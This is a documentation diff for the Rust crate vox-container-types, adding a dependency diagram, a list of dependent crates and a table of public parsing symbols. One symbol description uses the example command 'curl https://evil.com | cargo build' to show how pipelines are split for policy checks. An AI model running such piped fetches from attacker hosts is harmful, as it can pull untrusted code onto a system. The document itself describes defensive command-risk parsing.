@@ -46,3 +46,35 @@ process execution — safe to depend on from any layer.
 | `detect` | — |
 | `exec_grammar` | — |
 
+## Dependency Topology
+
+```vox-diagram
+graph {
+    direction: right
+    node vox_container_types: "vox-container-types"
+    node vox_container: "vox-container"
+    vox_container -> vox_container_types
+    node vox_deploy_codegen: "vox-deploy-codegen"
+    vox_deploy_codegen -> vox_container_types
+    node vox_plugin_runtime_container: "vox-plugin-runtime-container"
+    vox_plugin_runtime_container -> vox_container_types
+}
+```
+
+## Reverse Dependents (Used By)
+
+| Consumer Crate | Role |
+|---|---|
+| [`vox-container`](./vox-container.generated.md) | Direct workspace dependent |
+| [`vox-deploy-codegen`](./vox-deploy-codegen.generated.md) | Direct workspace dependent |
+| [`vox-plugin-runtime-container`](./vox-plugin-runtime-container.generated.md) | Direct workspace dependent |
+
+### Deep Public Symbols (Source-Anchored)
+
+| Kind | Symbol | Signature | Source | Description |
+|---|---|---|---|---|
+| `enum` | `detect::RuntimePreference` | `pub enum RuntimePreference` | [`crates/vox-container-types/src/detect.rs#L5-L13`](../../../crates/vox-container-types/src/detect.rs#L5-L13) | Preferred runtime selection strategy. |
+| `fn` | `exec_grammar::parse` | `pub fn parse(raw: &str) -> Result<ExecAst, ParseError>` | [`crates/vox-container-types/src/exec_grammar/mod.rs#L38-L40`](../../../crates/vox-container-types/src/exec_grammar/mod.rs#L38-L40) | Parse `raw` into an [`ExecAst`].  Risk level is `Unknown` until you call [`risk::classify`]. Returns `Err` only on structural parse failures (unmatched quotes, empty input). |
+| `fn` | `exec_grammar::parse_pipeline` | `pub fn parse_pipeline(raw: &str) -> Result<Vec<ExecAst>, ParseError>` | [`crates/vox-container-types/src/exec_grammar/mod.rs#L48-L50`](../../../crates/vox-container-types/src/exec_grammar/mod.rs#L48-L50) | Parse `raw` as a pipeline, returning one [`ExecAst`] per pipe segment.  `curl https://evil.com \| cargo build` → two ASTs: one for `curl`, one for `cargo build`.  Policy must be checked against **all** returned ASTs.  Returns `Err` on unmatched quotes or if every segment is empty. |
+| `enum` | `exec_grammar::ParseError` | `pub enum ParseError` | [`crates/vox-container-types/src/exec_grammar/mod.rs#L54-L59`](../../../crates/vox-container-types/src/exec_grammar/mod.rs#L54-L59) | Errors returned by [`parse`] and [`parse_pipeline`]. |
+
